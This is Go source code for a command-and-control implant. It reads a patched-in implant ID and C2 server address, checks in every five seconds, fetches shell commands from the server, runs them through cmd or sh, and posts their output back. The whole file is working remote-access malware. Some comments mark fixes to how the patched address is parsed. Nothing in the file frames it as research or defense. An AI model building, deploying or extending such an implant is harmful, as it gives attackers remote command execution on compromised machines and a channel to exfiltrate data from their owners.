package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"runtime" // For OS specific commands
	"strings"
	"time"

	_ "embed"
)

//go:embed placeholder.txt
var implantIDBytes []byte // This should contain the 36-byte unique token after patching.
// Initially, placeholder.txt should contain "deadbeef-0000-0000-0000-000000000000".

//go:embed c2_address.txt
var c2AddressBytes []byte // This will contain the C2 server address (e.g., "ip:port") after patching.
// Initially, c2_address.txt should contain "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX".

// implantID extracts the unique implant token.
// CORRECTED: Reads from implantIDBytes.
func implantID() string {
	s := string(implantIDBytes) // Use implantIDBytes

	// Trim at the first null byte, if any.
	// This is good practice, though the server's patch for implant ID
	// (36-byte UUID) shouldn't introduce nulls if lengths match perfectly.
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s) // Then trim whitespace.
}

// c2ServerAddress extracts the C2 server address.
// CORRECTED: Added null byte trimming.
func c2ServerAddress() string {
	s := string(c2AddressBytes) // Use c2AddressBytes

	// The server patches the C2 address and pads it with null bytes.
	// We MUST truncate the string at the first null byte to get the actual address.
	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
		s = s[:nullIdx]
	}
	return strings.TrimSpace(s) // Then trim any leading/trailing whitespace from the address itself.
}

// Placeholders - these must match the content of placeholder.txt and c2_address.txt respectively
// AND the placeholders used by the server for patching.
const (
	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
	// Ensure c2_address.txt contains this exact string before compiling the base implant.
	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
	checkInInterval      = 5 * time.Second
)

// URLs will be constructed dynamically
var (
	checkInURL       string
	commandsURL      string // Format string: "http://%s/implant-client/%s/commands"
	commandResultURL string
)

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
}

type CheckInPayload struct {
	ImplantID string `json:"implant_id"`
	IPAddress string `json:"ip_address"`
}

type CommandResultPayload struct {
	CommandID int    `json:"command_id"`
	Output    string `json:"output"`
}

func initializeConfig() bool {
	currentImplantID := implantID()
	currentC2Address := c2ServerAddress()

	// Debugging output to verify what's being read:
	// fmt.Printf("DEBUG: Raw implantIDBytes: %q\n", string(implantIDBytes))
	// fmt.Printf("DEBUG: Raw c2AddressBytes: %q\n", string(c2AddressBytes))
	// fmt.Printf("DEBUG: Parsed implantID: '%s'\n", currentImplantID)
	// fmt.Printf("DEBUG: Parsed c2Address: '%s'\n", currentC2Address)

	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
		fmt.Printf("Error: Implant ID not properly embedded/patched or is still the placeholder: '%s'\n", currentImplantID)
		return false
	}
	// This check is now more reliable because c2ServerAddress() trims nulls.
	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
		fmt.Printf("Error: C2 Server Address not properly embedded/patched or is still the placeholder: '%s'\n", currentC2Address)
		return false
	}

	c2BaseURL := currentC2Address
	if !strings.HasPrefix(c2BaseURL, "http://") && !strings.HasPrefix(c2BaseURL, "https://") {
		c2BaseURL = "http://" + c2BaseURL // Default to http if no scheme
	}

	checkInURL = fmt.Sprintf("%s/checkin", c2BaseURL)
	commandsURL = fmt.Sprintf("%s/implant-client/%%s/commands", c2BaseURL) // %%s to escape % for later Sprintf
	commandResultURL = fmt.Sprintf("%s/command-result", c2BaseURL)

	fmt.Printf("Implant Online. ID: %s, C2: %s\n", currentImplantID, c2BaseURL)
	fmt.Printf("Check-in URL: %s\n", checkInURL)
	fmt.Printf("Commands URL (template): %s\n", commandsURL)
	fmt.Printf("Command Result URL: %s\n", commandResultURL)
	return true
}

func main() {
	if !initializeConfig() {
		time.Sleep(10 * time.Second)
		return
	}

	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

func checkIn() {
	payload := CheckInPayload{
		ImplantID: implantID(), // This will now correctly use the patched ID
		IPAddress: "",
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling check-in payload:", err)
		return
	}

	// checkInURL should now be correctly formed without null bytes
	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error during check-in http.Post:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// fmt.Println("Check-in successful")
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Check-in failed. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
	}
}

func fetchAndExecuteCommands() {
	// Format the commandsURL with the actual implantID
	currentCommandsURL := fmt.Sprintf(commandsURL, implantID()) // implantID() is corrected
	// fmt.Println("Fetching commands from:", currentCommandsURL)

	// currentCommandsURL should now be correctly formed without null bytes in the base URL part
	resp, err := http.Get(currentCommandsURL)
	if err != nil {
		fmt.Println("Error fetching commands http.Get:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Error fetching commands. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading command response body:", err)
		return
	}

	var respStruct struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &respStruct); err != nil {
		fmt.Println("Error decoding command response JSON:", err, "-- Body was:", string(body))
		return
	}

	if len(respStruct.Commands) > 0 {
		fmt.Printf("Received %d command(s) to execute.\n", len(respStruct.Commands))
	}

	for _, cmd := range respStruct.Commands {
		fmt.Printf("Executing Command ID %d: %s\n", cmd.ID, cmd.Command)
		var output []byte
		var execErr error

		if runtime.GOOS == "windows" {
			command := exec.Command("cmd", "/C", cmd.Command)
			output, execErr = command.CombinedOutput()
		} else {
			command := exec.Command("sh", "-c", cmd.Command)
			output, execErr = command.CombinedOutput()
		}

		resultString := string(output)
		if execErr != nil {
			resultString += "\nExecution Error: " + execErr.Error()
			fmt.Printf("Error executing command ID %d: %v\nOutput: %s\n", cmd.ID, execErr, resultString)
		}
		sendOutput(cmd.ID, resultString)
	}
}

func sendOutput(cmdID int, output string) {
	payload := CommandResultPayload{
		CommandID: cmdID,
		Output:    output,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling command result payload:", err)
		return
	}

	// commandResultURL should now be correctly formed
	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending output http.Post:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// fmt.Printf("Command %d output sent successfully\n", cmdID)
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Failed to send output for command %d. Status: %s, Body: %s\n", cmdID, resp.Status, string(bodyBytes))
	}
}
